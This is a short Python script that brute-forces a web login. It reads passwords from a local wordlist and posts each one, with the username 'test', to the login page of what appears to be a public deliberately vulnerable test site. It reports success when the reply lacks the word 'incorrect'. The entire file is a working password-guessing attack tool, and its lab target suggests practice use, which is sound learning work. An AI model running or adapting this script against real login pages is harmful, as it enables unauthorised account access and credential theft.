import requests
import os

URL = "http://testphp.vulnweb.com/login.php"

USERNAME = "test"

password_file = "passwords.txt"

file_path = os.path.abspath(password_file)
print(f"Checking for file at: {file_path}")

if not os.path.exists(password_file):
    print(f"Error: The file '{password_file}' was not found. Please create it in the same directory as this script.")
    exit()

with open(password_file, "r") as file:
    passwords = file.read().splitlines()

for password in passwords:
    data = {"username": USERNAME, "password": password}
    response = requests.post(URL, data=data)

    if "incorrect" not in response.text:
        print(f"[+] Found password: {password}")
        break
    else:
        print(f"[-] Tried: {password}")

print("Brute force attempt completed.")
